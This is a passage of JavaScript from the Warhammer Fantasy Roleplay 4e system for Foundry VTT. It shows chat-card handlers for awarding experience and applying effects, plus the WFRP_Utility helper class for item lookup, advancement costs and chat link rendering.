        return ui.notifications.warn(game.i18n.localize("ErrorExp"))
      }
      game.user.targets.forEach(t => 
      {
        if (!alreadyAwarded.includes(t.actor.id)) 
        {
          t.actor.awardExp(amount, reason, msg.id);
        }
        else
        {
          ui.notifications.notify(`${t.actor.name} already received this reward.`);
        }
      });
      if (canvas.scene)
      { 
        game.user.updateTokenTargets([]);
        game.user.broadcastActivity({ targets: [] });
      }
    }
    else {
      if (!game.user.character)
        return ui.notifications.warn(game.i18n.localize("ErrorCharAssigned"))
      if (alreadyAwarded.includes(game.user.character.id))
        return ui.notifications.notify(`${game.user.character.name} already received this reward.`)

      foundry.utils.setProperty(msg, "flags.wfrp4e.experienceAwarded", alreadyAwarded.concat(game.user.character.id)); // Add locally to handle fast clicking or no GM 
      game.user.character.awardExp(amount, reason, msg.id);
    }
  }

  static async _onConditionScriptClick(event) {
    let condkey = event.target.dataset["condId"];
    let combatantId = event.target.dataset["combatantId"];
    let combatant = game.combat.combatants.get(combatantId);
    let msgId = $(event.currentTarget).parents(".message").attr("data-message-id");
    let message = game.messages.get(msgId);
    let conditionResult;

    let effect = combatant.actor.hasCondition(condkey);

    if (combatant.actor.isOwner && effect)
      conditionResult = await effect.scripts[0].execute({suppressMessage : true});
    else
      return ui.notifications.error(game.i18n.localize("CONDITION.ApplyError"))

    if (game.user.isGM)
      message.update(conditionResult);
    else
      await game.wfrp4e.socket.executeOnUserAndWait("GM", "updateMsg", { id: msgId, updateData: conditionResult });
  }

  static async _onApplyTargetEffect(event) {

    let applyData = {};
    let uuid = event.target.dataset.uuid;// || (event.target.dataset.lore ? "lore" : "")
    let effectPath = event.target.dataset.path;
    let messageId = $(event.currentTarget).parents('.message').attr("data-message-id");
    let message = game.messages.get(messageId);
    let test = message.getTest();
    let actor = test.actor;
    let item = test.item;
    let effect;

    if (!actor.isOwner)
      return ui.notifications.error("CHAT.ApplyError")


    if (effectPath)
    {
      effect = foundry.utils.getProperty(item, effectPath);
      applyData = {effectData : [effect.toObject()]};
    }
    else if (uuid)
    {
      applyData = {effectUuids : uuid};
      effect = await fromUuid(uuid);
    }
    else 
    {
      return ui.notifications.error("Unable to find effect to apply")
    }



    // let effect = actor.populateEffect(effectId, item, test)
    
    let targets = (game.user.targets.size ? Array.from(game.user.targets) : test.context.targets.map(t => WFRP_Utility.getToken(t))).map(t => t.actor);

    if (!(await effect.runPreApplyScript({test, targets})))
    {
      return
    }
    
    game.user.updateTokenTargets([]);
    game.user.broadcastActivity({ targets: [] });
          
    if (item && // If spell's Target and Range is "You", Apply to caster, not targets
      item.range && 
      item.range.value.toLowerCase() == game.i18n.localize("You").toLowerCase() && 
      item.target && 
      item.target.value.toLowerCase() == game.i18n.localize("You").toLowerCase())
      {
        targets = [actor];
      }

      applyData.messageId = messageId;
      for(let target of targets)
      {
        await target.applyEffect(applyData);
      }
  }

  static async _onPlaceAreaEffect(event) {
    let messageId = $(event.currentTarget).parents('.message').attr("data-message-id");
    let effectUuid = event.currentTarget.dataset.uuid;

    let test = game.messages.get(messageId).getTest();
    let radius;
    if (test?.result.overcast?.usage.target)
    {
      radius = test.result.overcast.usage.target.current;

      if (test.spell)
      {
        radius /= 2; // Spells define their diameter, not radius
      }
    }

    let effect = await fromUuid(effectUuid);
    if (!(await effect.runPreApplyScript({test})))
    {
      return
    }
    let template = await AbilityTemplate.fromEffect(effectUuid, messageId, radius);
    await template.drawPreview(event);
  }

  static _onOpposedImgClick(event) {
    let msg = game.messages.get($(event.currentTarget).parents(".message").attr("data-message-id"));
    let oppose = msg.getOppose();
    let speaker;

    if ($(event.currentTarget).hasClass("attacker"))
      speaker = oppose.attacker;
    else if ($(event.currentTarget).hasClass("defender"))
      speaker = oppose.defender;

    speaker.sheet.render(true);

  }

  static _onApplyCondition(event) {
    let actors = canvas.tokens.controlled.concat(Array.from(game.user.targets).filter(i => !canvas.tokens.controlled.includes(i))).map(a => a.actor);
    if (canvas.scene) { 
      game.user.updateTokenTargets([]);
      game.user.broadcastActivity({targets: []});
    }
    
    if (actors.length == 0)
    {
      actors.push(game.user.character);
      ui.notifications.notify(`${game.i18n.format("EFFECT.Applied", {name: game.wfrp4e.config.conditions[event.currentTarget.dataset.cond]})} ${game.user.character.name}`);
    }

    actors.forEach(a => {
      a.addCondition(event.currentTarget.dataset.cond);
    });
  }

}

/**
 * Provides general useful functions for various different parts of the system.
 *
 * This is basically a catch-all for useful functions that don't quite fit anywhere
 * else, but is used by many different areas of the system. Most of these functions
 * involve retrieving data from the configuration values or the compendia.
 *
 */
class WFRP_Utility {

  static _keepID(id, document) {
    try {
      let compendium = !!document.pack;
      let world = !compendium;
      let collection;

      if (compendium) {
        let pack = game.packs.get(document.pack);
        collection = pack.index;
      }
      else if (world)
        collection = document.collection;

      if (collection.has(id)) {
        ui.notifications.notify(`${game.i18n.format("ERROR.ID", {name: document.name})}`);
        return false
      }
      else return true
    }
    catch (e) {
      console.error(e);
      return false
    }
  }

  static propertyStringToArray(propertyString, propertyObject)
  {
      let newProperties = [];
      let oldProperties = propertyString.split(",").map(i => i.trim());
      for (let property of oldProperties) {
        if (!property)
          continue
  
        let newProperty = {};
        let splitProperty = property.split(" ");
        if (Number.isNumeric(splitProperty[splitProperty.length - 1])) {
          newProperty.value = parseInt(splitProperty[splitProperty.length - 1]);
          splitProperty.splice(splitProperty.length - 1, 1);
        }
  
        splitProperty = splitProperty.join(" ");
  
        newProperty.name = game.wfrp4e.utility.findKey(splitProperty, propertyObject);
        if (newProperty)
          newProperties.push(newProperty);
        else
          newProperties.push(property);
      }
      return newProperties
  }

  
  static propertyStringToObject(propertyString, propertyObject)
  {
      let array = this.propertyStringToArray(propertyString, propertyObject);
      return ItemWfrp4e._propertyArrayToObject(array, propertyObject)
  }

  /**
   * Roll characteristics given a species, or take average depending input
   * 
   * @param {string} species      Key or value for species in config
   * @param {bool} average        Take average or not
   */
  static async  speciesCharacteristics(species, average, subspecies) {
    let characteristics = {};
    let characteristicFormulae = game.wfrp4e.config.speciesCharacteristics[species];
    if (subspecies && game.wfrp4e.config.subspecies[species][subspecies].characteristics)
      characteristicFormulae = game.wfrp4e.config.subspecies[species][subspecies].characteristics;

    if (!characteristicFormulae) {
      ui.notifications.info(`${game.i18n.format("ERROR.Species", { name: species })}`);
      WFRP_Utility.log("Could not find species " + species + ": " + error, true);
      throw error
    }


    for (let char in game.wfrp4e.config.characteristics) {
      if (average) {
        // Take average - 2d10+20 -> split on +, take the 20, add 10 (average of 2d10). This assumes, perhaps erroneously, that all species will have a 2d10 randomizer
        characteristics[char] = { value: parseInt(characteristicFormulae[char].split("+")[1]) + 10, formula: characteristicFormulae[char] };
      }
      else {
        let roll = await new Roll(characteristicFormulae[char]).roll();
        characteristics[char] = { value: roll.total, formula: characteristicFormulae[char] + ` (${roll.result})` };
      }
    }
    return characteristics
  }


  static speciesSkillsTalents(species, subspecies) {
    let skills, talents, randomTalents, talentReplacement;

    skills = game.wfrp4e.config.speciesSkills[species];
    talents = game.wfrp4e.config.speciesTalents[species];
    randomTalents = game.wfrp4e.config.speciesRandomTalents[species] || {talents: 0};
    talentReplacement = game.wfrp4e.config.speciesTalentReplacement[species] || {};

    if (subspecies && game.wfrp4e.config.subspecies[species][subspecies].skills)
      skills = game.wfrp4e.config.subspecies[species][subspecies].skills;

    if (subspecies && game.wfrp4e.config.subspecies[species][subspecies].talents)
      talents = game.wfrp4e.config.subspecies[species][subspecies].talents;

    if (subspecies && game.wfrp4e.config.subspecies[species][subspecies].randomTalents)
      randomTalents = game.wfrp4e.config.subspecies[species][subspecies].randomTalents || {talents: 0};

    if (subspecies && game.wfrp4e.config.subspecies[species][subspecies].talentReplacement)
      talentReplacement = game.wfrp4e.config.subspecies[species][subspecies].talentReplacement || {};

    return { skills, talents, randomTalents, talentReplacement };
  }

  /**
   * Retrieves species movement value from config.
   * 
   * @param {String} species  species key for lookup
   */
  static speciesMovement(species, subspecies) {
    let move = game.wfrp4e.config.speciesMovement[species];
    if (subspecies && game.wfrp4e.config.subspecies[species].movement)
      move = game.wfrp4e.config.subspecies[species].movement;
    return move;
  }

  /**
   * Searches an object for a key that matches the given value.
   * 
   * @param {String} value  value whose key is being searched for
   * @param {Object} obj    object to be searched in
   */
  static findKey(value, obj, options = {}) {
    if (!value || !obj)
      return undefined;

    if (options.caseInsensitive) {
      for (let key in obj) {
        if (obj[key].toLowerCase() == value.toLowerCase())
          return key;
      }
    }
    else {
      for (let key in obj) {
        if (obj[key] == value)
          return key;
      }
    }
  }

  static getSystemEffects(vehicle=false) {
    if (vehicle)
    {
      return foundry.utils.duplicate(game.wfrp4e.config.vehicleSystemEffects)
    }
    else 
    {
      return foundry.utils.mergeObject(duplicate(game.wfrp4e.config.systemEffects), foundry.utils.duplicate(game.wfrp4e.config.symptomEffects))
    }

  }

  static find(name, type)
  {
    if (type == "skill")
      return game.wfrp4e.utility.findSkill(name)
    if (type == "talent")
      return game.wfrp4e.utility.findTalent(name)
    else 
      return game.wfrp4e.utility.findItem(name, type)
  }

  
  static findItemId(id, type) {
    if (id.includes("."))
      return fromUuid(id);

    if (game.items.has(id))
      return game.items.get(id)

    let packs = game.wfrp4e.tags.getPacksWithTag(type);
    for (let pack of packs) {
      if (pack.index.has(id)) {
        return pack.getDocument(id)
      }
    }
  }


  /**
   * Specialized function to find a skill that accommodates for specializations.
   * 
   * Special considerations needs to be provided for finding skills because of specializations.
   * First, it will try to find the skill exactly, if that cannot be found, remove the specialization
   * and try to find any skill that would match if it had no specialization. If it is found, it will 
   * return that skill, renaming it to match the query.
   * 
   * For example, input could be Lore (Cheese), which doesn't exist. So it will try again testing
   * with just the skill "Lore", and trying to match it with any other skill by removing its 
   * specialization as well. Thus, lore matches with the first Lore skill, which should be 
   * the blank "Lore ()" skill. This is renamed as Lore (Cheese) and returned.
   * 
   * @param {String} skillName skill name to be searched for
   */
  static async findSkill(skillName) {
    let skill = await WFRP_Utility.findExactName(skillName, "skill");

    if (skill)
      return skill;

    skill = await WFRP_Utility.findBaseName(skillName, "skill");

    if (skill)
      return skill;

    throw `"${game.i18n.format("ERROR.NoSkill", {skill: skillName})}"`;
  }

  /**
   * Specialized function to find a talent that accommodates for specializations.
   * 
   * Special considerations needs to be provided for finding talents because of specializations.
   * First, it will try to find the talent exactly, if that cannot be found, remove the specialization
   * and try to find any talent that would match if it had no specialization. If it is found, it will 
   * return that talent, renaming it to match the query.
   * 
   * For example, input could be Etiquette (Cheesemongers), which doesn't exist. So it will try again testing
   * with just the talent "Etiquette", and trying to match it with any other talent by removing its 
   * specialization as well. Thus, Etiquette matches with the first Etiquette talent, which should be 
   * the blank "Etiquette ()" talent. This is renamed as Etiquette (Cheesemongers) and returned.
   * 
   * @param {String} talentName talent name to be searched for
   */
  static async findTalent(talentName) {
    let talent = await WFRP_Utility.findExactName(talentName, "talent");

    if (talent)
      return talent;

    talent = await WFRP_Utility.findBaseName(talentName, "talent");

    if (talent)
      return talent;

    throw `"${game.i18n.format("ERROR.NoTalent", {talent: talentName})}"`;
  }

  /**
   * Finds an item of the exact same name (Prejudice (Target) !== Prejudice (Nobles)).
   *
   * @param {string} name item name to be searched for
   * @param {[]|string} type type or array of types of item to be searched for
   *
   */
  static async findExactName(name, type) {
    if (typeof type === "string")
      type = [type];

    if (!type)
      type = [];

    // First try world items
    let searchResult = game.items.contents.find(t => (type.length == 0 || type.includes(t.type)) && t.name === name);

    if (searchResult) {
      return searchResult;
    }

    // Search compendium packs for base name item
    for (let pack of game.wfrp4e.tags.getPacksWithTag(type)) {
      const index = pack.indexed ? pack.index : await pack.getIndex();
      let indexResult = index.find(t => t.name === name && (type.length == 0 || type.includes(t.type)));

      if (indexResult)
        return pack.getDocument(indexResult._id);
    }
  }

  /**
   * Finds an item with the same base name (Prejudice (Target) == Prejudice (Nobles)).
   *
   * @param {String} name item name to be searched for
   * @param {Collection} collection collection to search in, could be a world collection or pack index
   * @param {String} pack if collection is a pack index, include the pack to retrieve the document
   *
   */
  static async findBaseName(name, type)
  {
    if (typeof type == "string")
    {
      type = [type];
    }

    if (!type)
    {
      type = [];
    }

    let baseName = this.extractBaseName(name);

    let searchResult = game.items.contents.find(t => (type.length == 0 || type.includes(t.type)) && (t.name == name || this.extractBaseName(t.name) == baseName));
    if (!searchResult)
    {
      // Search compendium packs for base name item
      for (let pack of game.wfrp4e.tags.getPacksWithTag(type)) {
        const index = pack.indexed ? pack.index : await pack.getIndex();
        let indexResult = index.find(t => this.extractBaseName(t.name) == this.extractBaseName(name) && (type.length == 0 || type.includes(t.type))); // if type is specified, check, otherwise it doesn't matter
        if (indexResult)
          searchResult = await pack.getDocument(indexResult._id);
      }
    }

    if (searchResult) {
      let item = searchResult.clone();
      item.updateSource({ name }); // This is important if a specialized talent wasn't found. Without it, <Talent ()> would be added instead of <Talent (Specialization)>
      return item;
    }
  }

  static extractBaseName(name)
  {
    return name.split("(")[0].trim();
  }


  // Obviously this isn't very good, but it works for now
  static extractParenthesesText(name="", opening="(")
  {
    // Default
    let closing = ")";

    if (opening == "[")
      closing = "]";

    if (opening == "<")
      closing = ">";

    return name.split(opening)[1]?.split(closing)[0].trim();
  }


  /**
   * 
   * @param {String} itemName   Item name to be searched for 
   * @param {String|Array} itemType   Item's type (armour, weapon, etc.)
   */
  static async findItem(itemName, itemType) {
    let item = await WFRP_Utility.findExactName(itemName, itemType);

    if (item)
      return item;

    item = await WFRP_Utility.findBaseName(itemName, itemType);

    if (item)
      return item;

    console.error("Cannot find " + itemName);
  }


  /**
   * Gets every item of the type specified in the world and compendium packs (that have included a tag)
   * @param {String} type type of items to retrieve
   */
  static async findAll(type, loadingLabel = "", index=false) {
    let items = game.items.contents.filter(i => i.type == type);

    let packCounter = 0;
    let packs = game.wfrp4e.tags.getPacksWithTag(type);
    for (let p of packs) {
      if (loadingLabel)
      {
        packCounter++;
        SceneNavigation.displayProgressBar({label: loadingLabel, pct: (packCounter / packs.length)*100 });
      }
      let content;
      if (index)
      {
        content = p.index;
      }
      else 
      {
        content = await p.getDocuments();
      }
      items = items.concat(content.filter(i => i.type == type));
    }
    return items.sort((a, b) => a.name > b.name ? 1 : -1);
  }


  // Used to sort arrays based on string value (used in organizing skills to be alphabetical - see ActorWfrp4e.prepareItems())
  static nameSorter(a, b) {
    if (a.name.toLowerCase() < b.name.toLowerCase())
      return -1;
    if (a.name.toLowerCase() > b.name.toLowerCase())
      return 1;
    return 0;
  }

  /**
   * Return a list of all qualities
   */
  static qualityList() {
    let weapon = foundry.utils.duplicate(game.wfrp4e.config.weaponQualities);
    let armor = foundry.utils.duplicate(game.wfrp4e.config.armorQualities);
    let item = foundry.utils.duplicate(game.wfrp4e.config.itemQualities);
    let list = foundry.utils.mergeObject(weapon, foundry.utils.mergeObject(item, armor));
    return list;
  }


  /**
   * Return a list of all flaws
   */
  static flawList() {
    let weapon = foundry.utils.duplicate(game.wfrp4e.config.weaponFlaws);
    let armor = foundry.utils.duplicate(game.wfrp4e.config.armorFlaws);
    let item = foundry.utils.duplicate(game.wfrp4e.config.itemFlaws);
    let list = foundry.utils.mergeObject(weapon, foundry.utils.mergeObject(item, armor));
    return list;
  }

  static allProperties() {
    return foundry.utils.mergeObject(this.qualityList(), this.flawList())
  }

  /**
   * Looks up advancement cost based on current advancement and type.
   *
   * @param {Number} currentAdvances   Number of advances currently
   * @param {String} type              "characteristic" or "skill"
   * @param {Number} modifier          Cost modifier per advancement
   */
  static _calculateAdvCost(currentAdvances, type, modifier = 0) {
    let index = Math.floor(currentAdvances / 5);
    index = index < 0 ? 0 : index; // min 0

    if (index >= game.wfrp4e.config.xpCost[type].length)
      return game.wfrp4e.config.xpCost[type][game.wfrp4e.config.xpCost[type].length - 1] + modifier;
    return game.wfrp4e.config.xpCost[type][index] + modifier;
  }

  /**
   * Looks up a bulk advancement cost based on current advancement and type.
   *
   * @param {Number} start        Number of current advances
   * @param {Number} end          Target number of advances
   * @param {String} type         "characteristic" or "skill"
   * @param {Number} modifier     Cost modifier of the skill
   */
  static _calculateAdvRangeCost(start, end, type, modifier = 0) {
    let cost = 0;

    let multiplier = 1;

    // If reverse advance, multiply by -1 to grant XP back
    if (end < start) {
      multiplier = -1;
      let temp = end;
      end = start;
      start = temp;
    }

    while (start < end) {
      cost += this._calculateAdvCost(start, type, modifier);
      start++;
    }
    return cost * multiplier
  }

  static advancementDialog(item, advances, type, actor)
  {
    let start = item instanceof Item ? item.advances.value : actor.characteristics[item].advances;
    let end = advances;
    let name = item instanceof Item ? item.name : game.wfrp4e.config.characteristics[item];

    let career = false;
    try 
    {

      if (item instanceof Item)
      {
        let currentCareer = actor.currentCareer;
        if (currentCareer.system.skills.find(i => i == item.name))
        {
          career = true;
        }
      }
      else 
      {
        career = actor.system.characteristics[item].career;
      }
    }
    catch(e)
    {
      career = false;
    }
    return new Promise(resolve => {
      let xp = this._calculateAdvRangeCost(start, end, type, item.advances?.costModifier);
      if (!career)
      {
        xp *= 2;
      }
      if (xp) {
        new Dialog({
          title: game.i18n.localize("DIALOG.Advancement"),
          content: 
          `
          <p>${game.i18n.localize("DIALOG.AdvancementContent")}</p>
          <div class="form-group">
          <input type="number" value=${xp}>
          </div>
          `,
          buttons: {
            ok: {
              label: game.i18n.localize("Ok"),
              callback: async (dlg) => {
                xp = Number(dlg.find("input")[0]?.value) || xp;
                if (xp != 0)
                {
                  try {

                    let newSpent = actor.details.experience.spent + xp;
                    WFRP_Utility.checkValidAdvancement(actor.details.experience.total, newSpent, game.i18n.localize("ACTOR.ErrorImprove"), name);
                    let log = actor._addToExpLog(xp, `${name} (${end-start})`, newSpent);
                    actor.update({ "system.details.experience.spent": newSpent, "system.details.experience.log": log });
                    resolve(true);
                  }
                  catch (e)
                  {
                    ui.notifications.error(e);
                    resolve(false);
                  }
                }
              }
            },
            free: {
              label: game.i18n.localize("Free"),
              callback: () => { resolve(true); }
            }
          },
          close : () => {resolve(false);}
        }).render(true);
      }
      else resolve(true);
    })
  }

  static memorizeCostDialog(spell, actor) {
    return new Promise(resolve => {
      let xp = this.calculateSpellCost(spell, actor);
      if (xp) {
        new Dialog({
          title: game.i18n.localize("DIALOG.MemorizeSpell"),
          content: `<p>${game.i18n.format("DIALOG.MemorizeSpellContent", { xp })}</p>`,
          buttons: {
            ok: {
              label: game.i18n.localize("Ok"),
              callback: () => {
                let newSpent = actor.details.experience.spent + xp;
                let log = actor._addToExpLog(xp, game.i18n.format("LOG.MemorizedSpell", { name: spell.name }), newSpent);
                actor.update({ "system.details.experience.spent": newSpent, "system.details.experience.log": log });
                resolve(true);
              }
            },
            free: {
              label: game.i18n.localize("Free"),
              callback: () => { resolve(true); }
            }
          },
          close : () => {resolve(false);}
        }).render(true);
      }
      else resolve(true);
    })
  }


  
  static miracleGainedDialog(miracle, actor)
  {
    let xp = 100 * (actor.itemTypes["prayer"].filter(p => p.prayerType.value == "miracle").length);
    if (xp) {
      new Dialog({
        title: game.i18n.localize("DIALOG.GainPrayer"),
        content: `<p>${game.i18n.format("DIALOG.GainPrayerContent", { xp })}</p>`,
        buttons: {
          ok: {
            label: game.i18n.localize("Ok"),
            callback: () => {
              let newSpent = actor.details.experience.spent + xp;
              let log = actor._addToExpLog(xp, game.i18n.format("LOG.GainPrayer", { name: miracle.name }), newSpent);
              actor.update({ "system.details.experience.spent": newSpent, "system.details.experience.log": log });
            }
          },
          free: {
            label: game.i18n.localize("Free"),
            callback: () => { }
          }
        }
      }).render(true);
    }
  }

  static calculateSpellCost(spell, actor)
  {
    let cost = 0;
    let bonus = 0;
    let currentlyKnown = 0;

    if (spell.system.ritual.value)
    {
      return spell.system.ritual.xp;
    }


    if (["slaanesh", "tzeentch", "nurgle"].includes(spell.lore.value))
      return 0

    if (spell.lore.value == "petty" || spell.lore.value == game.i18n.localize("WFRP4E.MagicLores.petty"))
      bonus = actor.characteristics.wp.bonus;
    else 
      bonus = actor.characteristics.int.bonus;

    if (spell.lore.value != "petty" && spell.lore.value != game.i18n.localize("WFRP4E.MagicLores.petty"))
    {
      currentlyKnown = actor.itemTypes["spell"].filter(i => i.lore.value == spell.lore.value && i.memorized.value).length;
    }
    else if (spell.lore.value == "petty" || spell.lore.value == game.i18n.localize("WFRP4E.MagicLores.petty"))
    {
      currentlyKnown = actor.itemTypes["spell"].filter(i => i.lore.value == spell.lore.value).length;
      if (currentlyKnown < bonus)
        return 0 // First WPB petty spells are free
    }

    let costKey = currentlyKnown;
    if (spell.lore.value != "petty" && spell.lore.value != game.i18n.localize("WFRP4E.MagicLores.petty"))
      costKey++; // Not sure if this is right, but arcane and petty seem to scale different per th example given

    cost = Math.ceil(costKey / bonus) * 100;

    if (spell.lore.value == "petty" || spell.lore.value == game.i18n.localize("WFRP4E.MagicLores.petty")) cost *= 0.5; // Petty costs 50 each instead of 100

    return cost
  }

  /**
   * Posts the symptom effects, then secretly posts the treatment to the GM.
   * 
   * @param {String} symptom  symptom name to be posted
   */
  static async postSymptom(symptom) {
    let symkey = WFRP_Utility.findKey(symptom.split("(")[0].trim(), game.wfrp4e.config.symptoms);
    let content = `<b>${symptom}</b>: ${game.wfrp4e.config.symptomDescriptions[symkey]}`;
    let chatOptions = {
      user: game.user.id,
      rollMode: game.settings.get("core", "rollMode"),
      content: content
    };
    if (["gmroll", "blindroll"].includes(chatOptions.rollMode)) chatOptions["whisper"] = ChatMessage.getWhisperRecipients("GM").map(u => u.id);
    if (chatOptions.rollMode === "blindroll") chatOptions["blind"] = true;
    ChatMessage.create(chatOptions);

    if (game.user.isGM) {
      content = `<b>${symptom} ${game.i18n.localize("Treatment")}</b>: ${game.wfrp4e.config.symptomTreatment[symkey]}`;
      chatOptions = {
        user: game.user.id,
        rollMode: game.settings.get("core", "rollMode"),
        content: await TextEditor.enrichHTML(content, {async: true})
      };
      chatOptions["whisper"] = ChatMessage.getWhisperRecipients("GM").map(u => u.id);
      ChatMessage.create(chatOptions);
    }
  }

  /**
   * Posts the definition of a quality or flaw to chat.
   * 
   * @param {String} property   name of the quality or flaw
   */
  static  async postProperty(property) {
    let properties = foundry.utils.mergeObject(WFRP_Utility.qualityList(), WFRP_Utility.flawList()),
      propertyDescr = Object.assign(duplicate(game.wfrp4e.config.qualityDescriptions), game.wfrp4e.config.flawDescriptions),
      propertyKey;

    property = this.parsePropertyName(property.replace(/,/g, '').trim());

    propertyKey = WFRP_Utility.findKey(property, properties);

    let propertyDescription = `<b>${property}:</b><br>${propertyDescr[propertyKey]}`;
    propertyDescription = propertyDescription.replace("(Rating)", property.split(" ")[1]);


    let chatOptions = {
      user: game.user.id,
      rollMode: game.settings.get("core", "rollMode"),
      content: await TextEditor.enrichHTML(propertyDescription, {async: true})
    };
    if (["gmroll", "blindroll"].includes(chatOptions.rollMode)) chatOptions["whisper"] = ChatMessage.getWhisperRecipients("GM").map(u => u.id);
    if (chatOptions.rollMode === "blindroll") chatOptions["blind"] = true;
    ChatMessage.create(chatOptions);
  }

  /**
   * Helper function to easily find the property name
   * // Todo: regex?
   * @param {String} property 
   */
  static parsePropertyName(property) {
    property = property.trim();
    if (!isNaN(property[property.length - 1]))
      return property.substring(0, property.length - 2).trim()
    else if (property.includes("("))
      return property.split("(")[0].trim()
    else
      return property;
  }

  /**
   * Helper function to set up chat data (set roll mode and content).
   * 
   * @param {String} content 
   * @param {String} modeOverride 
   * @param {Boolean} isRoll 
   */
  static chatDataSetup(content, modeOverride, isRoll = false, {forceWhisper, alias, flavor}={}) {
    let chatData = {
      user: game.user.id,
      rollMode: modeOverride || game.settings.get("core", "rollMode"),
      content: content
    };
    if (isRoll)
      chatData.sound = CONFIG.sounds.dice;

    if (["gmroll", "blindroll"].includes(chatData.rollMode)) chatData["whisper"] = ChatMessage.getWhisperRecipients("GM").map(u => u.id);
    if (chatData.rollMode === "blindroll") chatData["blind"] = true;
    else if (chatData.rollMode === "selfroll") chatData["whisper"] = [game.user.id];

    if (alias)
      chatData.speaker = {alias};
    if (flavor)
      chatData.flavor = flavor;

    if (forceWhisper) { // Final force !
      chatData["speaker"] = ChatMessage.getSpeaker();
      chatData["whisper"] = ChatMessage.getWhisperRecipients(forceWhisper);
    }

    return chatData;
  }

  /**
   * Looks through object values and finds the one that most closely matches the query, returning the key.
   * 
   * Used by condition lookup.
   * 
   * @param {Object} Object Object being searched in
   * @param {*} query Value trying to match
   */
  static matchClosest(object, query, options = {}) {
    query = query.toLowerCase();
    let keys = Object.keys(object);
    let match = [];
    for (let key of keys) {
      let percentage = 0;
      let matchCounter = 0;
      let myword;
      if (options.matchKeys)
        myword = key.toLowerCase();
      else
        myword = object[key].toLowerCase();
      for (let i = 0; i < myword.length; i++) {
        if (myword[i] == query[i]) {
          matchCounter++;
        }
      }
      percentage = matchCounter / key.length;
      match.push(percentage);
    }
    let maxIndex = match.indexOf(Math.max.apply(Math, match));
    return keys[maxIndex]
  }

  /**
   * Returns token speaker if available, otherwise, returns actor.
   * 
   * @param {Object} speaker  speaker object containing actor and otken
   */
  static getSpeaker(speaker) {
    let actor = game.actors.get(speaker.actor);
    if (speaker.token)
      actor = game.scenes.get(speaker.scene).tokens.get(speaker.token).actor;
    return actor
  }


  static getToken(speaker) {
    return game.scenes.get(speaker?.scene)?.tokens?.get(speaker?.token)
  }

  /**
   * Returns all basic skills from the skills compendium
   */
  static async allBasicSkills() {
    let returnSkills = [];

    const packs = game.wfrp4e.tags.getPacksWithTag(["skill"]);

    if (!packs.length)
      return []

    for (let pack of packs) {
      let items;
      await pack.getDocuments().then(content => items = content.filter(i => i.type == "skill"));
      for (let i of items) {
        if (i.system.advanced.value == "bsc") {
          if (i.system.grouped.value != "noSpec") {
            let skill = i.toObject();
            let startParen = skill.name.indexOf("(");
            skill.name = skill.name.substring(0, startParen).trim();
            if (returnSkills.filter(x => x.name.includes(skill.name)).length <= 0)
              returnSkills.push(skill);
          }
          else
            returnSkills.push(i.toObject());
        }
      }
    }
    WFRP_Utility.log("Found Basic Skills: ", undefined, returnSkills );
    return returnSkills;
  }

  /**
   * Returns Gold Crown, Silver Shilling, and Brass Penny from trappings compendium
   */
  static async allMoneyItems() {
    let moneyItems = [];
    const packs = game.wfrp4e.tags.getPacksWithTag("money");

    if (!packs.length)
      return []

    for (let pack of packs) {
      let items;
      await pack.getDocuments().then(content => items = content.filter(i => i.type == "money").map(i => i.toObject()));

      let money = items.filter(t => Object.values(game.wfrp4e.config.moneyNames).map(n => n.toLowerCase()).includes(t.name.toLowerCase()));

      moneyItems = moneyItems.concat(money.filter(m => !moneyItems.find(i => i.name.toLowerCase() == m.name.toLowerCase()))); // Remove duplicates
    }
    WFRP_Utility.log("Found Money Items: ", undefined, moneyItems);
    return moneyItems
  }

  static alterDifficulty(difficulty, steps) {
    let difficulties = Object.keys(game.wfrp4e.config.difficultyLabels);
    let difficultyIndex = difficulties.findIndex(d => d == difficulty) + steps;
    difficultyIndex = Math.clamped(difficultyIndex, 0, difficulties.length - 1);
    return difficulties[difficultyIndex]
  }

  /**
   * Converts custom entity to clickable html element.
   * 
   * @param {String} match Entire string being converted (@Roll["1d8"])
   * @param {String} entityType Custom entity type - Roll, Table, etc
   * @param {String} id Input given in the custom link "1d8" above
   * @param {String} name Name given @Table["minormis"]{name}
   */
  static _replaceCustomLink(match, entityType, id, name) {
    let ids = id.split(","); // only used by fear/terror/exp for multiple arguments
    switch (entityType) {
      case "Roll":
        return `<a class="chat-roll" data-roll="${ids[0]}"><i class='fas fa-dice'></i> ${name ? name : id}</a>`
      case "Table":
        return `<a class = "table-click" data-table="${ids[0]}"><i class="fas fa-list"></i> ${(game.wfrp4e.tables.findTable(id)?.name && !name) ? game.wfrp4e.tables.findTable(id)?.name : name}</a>`
      case "Symptom":
        return `<a class = "symptom-tag" data-symptom="${ids[0]}"><i class='fas fa-user-injured'></i> ${name ? name : id}</a>`
      case "Condition":
        return `<a class = "condition-chat" data-cond="${ids[0]}"><i class='fas fa-user-injured'></i> ${name ? name : id}</a>`
      case "Pay":
        return `<a class = "pay-link" data-pay="${ids[0]}"><i class="fas fa-coins"></i> ${name ? name : id}</a>`
      case "Credit":
        return `<a class = "credit-link" data-credit="${ids[0]}"><i class="fas fa-coins"></i> ${name ? name : id}</a>`
      case "Corruption":
        return `<a class = "corruption-link" data-strength="${ids[0]}"><img src="systems/wfrp4e/ui/chaos.svg" height=15px width=15px style="border:none"> ${name ? name : id}</a>`
      case "Fear":
        return `<a class = "fear-link" data-value="${ids[0]}" data-name="${ids[1] || ""}"><img src="systems/wfrp4e/ui/fear.svg" height=15px width=15px style="border:none"> ${entityType} ${ids[0]}</a>`
      case "Terror":
        return `<a class = "terror-link" data-value="${ids[0]}" data-name="${ids[1] || ""}"><img src="systems/wfrp4e/ui/terror.svg" height=15px width=15px style="border:none"> ${entityType} ${ids[0]}</a>`
      case "Exp":
        return `<a class = "exp-link" data-amount="${ids[0]}" data-reason="${ids[1] || ""}"><i class="fas fa-plus"></i> ${name ? name : (ids[1] || ids[0])}</a>`
    }
  }

  /**
   * Collects data from the table click event and sends it to game.wfrp4e.tables to be rolled.
   * 
   * @param {Object} event  click event
   */
  static async handleTableClick(event) {
    let modifier = parseInt($(event.currentTarget).attr("data-modifier")) || 0;
    let messageId= $(event.currentTarget).parents(".message").attr("data-message-id");
    let html;
    let chatOptions = this.chatDataSetup("", game.settings.get("core", "rollMode"), true);

    if (event.button == 0) {
      let clickText = event.target.text || event.target.textContent;
      if (clickText.trim() == game.i18n.localize("ROLL.CritCast")) {
        html = game.wfrp4e.tables.criticalCastMenu($(event.currentTarget).attr("data-table"));
      }

      else if (clickText.trim() == game.i18n.localize("ROLL.TotalPower"))
        html = game.wfrp4e.tables.restrictedCriticalCastMenu();

      // Not really a table but whatever
